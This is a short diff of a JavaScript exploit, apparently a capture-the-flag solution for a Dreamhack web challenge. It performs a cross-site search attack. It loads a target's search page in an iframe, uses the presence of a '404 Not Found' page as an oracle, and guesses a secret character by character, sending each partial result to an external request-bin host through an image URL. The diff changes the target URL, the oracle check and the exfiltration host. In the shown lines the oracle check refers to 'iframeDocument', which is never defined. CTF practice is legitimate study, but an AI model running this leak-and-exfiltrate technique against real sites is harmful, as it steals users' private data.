@@ -6,7 +6,7 @@
             const iframe = document.getElementById("iframe");
             iframe.src = url;
             iframe.onload = () => { 
-                if (iframe.contentWindow.frames.length != 0)
+                if (iframeDocument && iframeDocument.body.innerHTML.indexOf("404 Not Found") === -1)
                     return resolve();
                 else
                     return reject();
@@ -16,7 +16,7 @@
     async function search(query) {
         try {
             await req(
-              `/search?keyword=${query}`
+              `http://localhost:8000/search?keyword=${query}`
             );
             return true;
         } catch (e) {
@@ -30,7 +30,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://nlqdovw.request.dreamhack.games/${secret}`;
+                    img.src = `https://xshiofr.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
